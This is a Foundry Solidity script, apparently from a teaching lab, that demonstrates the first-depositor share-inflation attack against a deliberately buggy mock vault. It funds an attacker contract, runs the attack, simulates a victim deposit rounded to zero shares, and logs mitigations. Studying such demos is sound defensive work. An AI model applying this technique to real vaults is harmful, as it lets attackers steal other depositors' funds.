// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

// FIX: thêm Script để dùng vm và startBroadcast/stopBroadcast
import "forge-std/Script.sol";

// FIX: thêm console thật của Foundry để in log ra terminal
import "forge-std/console.sol";

import "./Deploy.s.sol";
import "../src/attackers/Attacker_PoolImbalance.sol";

contract DemoPoolAttack is Script {
    DeployScript public deploy;
    Attacker_PoolImbalance public attacker;
    
    function run() external {
        // 1. Deploy infrastructure
        deploy = new DeployScript();
        deploy.run();
        
        (
            address tokenA,
            address tokenB,
            address dai,
            address govToken,
            address factory,
            address router,
            address pairAB,
            address oracleSpot,
            address oracleTWAP,
            address flashLender,
            address lendingMock,
            address governanceWeak,
            address vaultBuggy,
            address vaultFixed
        ) = deploy.getAddresses();
        
        // tránh warning unused local variable
        tokenB; dai; govToken; factory; router; pairAB;
        oracleSpot; oracleTWAP; flashLender; lendingMock;
        governanceWeak; vaultFixed;

        // FIX: dùng console.log thật thay vì hàm console rỗng
        console.log("=== VAULT INFLATION ATTACK DEMO ===");
        console.log("");
        
        // FIX: mở broadcast cho phần attack sau deploy
        // Nếu không, phần dưới có thể chỉ là simulation chứ không thành tx on-chain
        vm.startBroadcast();

        // 2. Deploy attacker
        attacker = new Attacker_PoolImbalance();
        
        // 3. Fund attacker
        MockERC20(tokenA).mint(address(attacker), 100000 * 1e18);
        console.log("Attacker funded with 100,000 tokenA");
        
        // 4. Show initial state
        console.log("");
        console.log("Initial Vault State:");
        console.log("  Total shares:", VaultBuggy(vaultBuggy).totalShares());
        console.log("  Total assets:", VaultBuggy(vaultBuggy).totalAssets() / 1e18);
        
        // 5. Execute attack - First depositor inflation
        console.log("");
        console.log("Executing Vault Inflation Attack...");
        console.log("  Step 1: Attacker becomes first depositor with 1 wei");
        console.log("  Step 2: Attacker donates 50,000 tokenA to vault");
        console.log("  Step 3: Share price is now inflated!");
        
        try attacker.attackVaultInflation(
            vaultBuggy,
            tokenA,
            50000 * 1e18
        ) {
            console.log("");
            console.log("Attack setup successful!");
            
            uint256 totalShares = VaultBuggy(vaultBuggy).totalShares();
            uint256 totalAssets = VaultBuggy(vaultBuggy).totalAssets();

            console.log("  Total shares:", totalShares);
            console.log("  Total assets:", totalAssets / 1e18);

            // FIX: tránh chia cho 0
            if (totalShares > 0) {
                console.log("  Share value:", (totalAssets / totalShares) / 1e18);
            }
            
            // 6. Simulate victim deposit
            console.log("");
            console.log("Victim attempts to deposit 25,000 tokenA...");
            
            // FIX: không dùng vm.startPrank trong forge script --broadcast để giả victim riêng
            // vì tx thật vẫn do private key broadcast ký.
            // Thay vào đó, cho broadcaster hiện tại đóng vai victim để demo rounding loss ổn định.
            MockERC20 token = MockERC20(tokenA);

            // FIX: mint token cho chính broadcaster hiện tại thay vì mint cho address(0x1234)
            // để approve + deposit không bị lệch chủ thể/caller
            address simulatedVictim = msg.sender;
            token.mint(simulatedVictim, 25000 * 1e18);

            // FIX: broadcaster hiện tại tự approve và deposit
            token.approve(vaultBuggy, type(uint256).max);
            uint256 victimShares = VaultBuggy(vaultBuggy).deposit(25000 * 1e18);
            
            console.log("  Victim received shares:", victimShares);
            console.log("  Expected: ~25,000 shares");
            console.log("  Actual shares after manipulation:", victimShares);
            
            if (victimShares == 0) {
                console.log("");
                console.log("=== ATTACK SUCCESSFUL ===");
                console.log("Victim received 0 shares due to rounding!");
                console.log("Victim's 25,000 tokenA are stuck in vault!");
                console.log("Attacker can now withdraw with their 1 share!");
            } else {
                console.log("");
                console.log("Attack did not fully zero out victim shares in this run.");
                console.log("But the victim still received far fewer shares than expected.");
            }
            
        } catch Error(string memory reason) {
            console.log("Attack failed:", reason);
        } catch {
            // FIX: thêm catch tổng quát để dễ debug hơn
            console.log("Attack failed: unknown error");
        }

        // FIX: đóng broadcast cho phần attack
        vm.stopBroadcast();
        
        console.log("");
        console.log("=== EXPLANATION ===");
        console.log("This attack exploits vaults with improper first deposit handling.");
        console.log("Attacker can:");
        console.log("1. Be first depositor with tiny amount (1 wei)");
        console.log("2. Donate large amount to inflate share price");
        console.log("3. Subsequent deposits get rounded down to 0 shares");
        console.log("4. Attacker steals victim's deposited funds");
        console.log("");
        console.log("MITIGATION:");
        console.log("- Burn minimum shares on first deposit (like Uniswap V2)");
        console.log("- Use virtual shares/assets");
        console.log("- Check balance before/after transfer");
    }

    // FIX: xóa các hàm console(...) rỗng vì chúng che mất console thật của forge-std
}